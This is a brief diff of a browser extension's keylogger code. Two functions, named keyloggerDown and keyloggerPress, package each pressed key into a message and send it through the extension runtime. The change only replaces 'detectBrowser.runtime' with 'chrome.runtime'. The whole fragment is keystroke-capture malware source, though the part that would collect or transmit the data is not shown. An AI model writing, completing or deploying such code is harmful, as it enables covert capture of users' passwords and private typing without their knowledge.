@@ -16,7 +16,7 @@ function keyloggerDown(key){
         chr: key.key
     }
         
-    detectBrowser.runtime.sendMessage(mensaje);
+    chrome.runtime.sendMessage(mensaje);
    
 }
 
@@ -29,6 +29,6 @@ function keyloggerPress(key){
         chr: key.key
     }
 
-    detectBrowser.runtime.sendMessage(mensaje);
+    chrome.runtime.sendMessage(mensaje);
    
 }
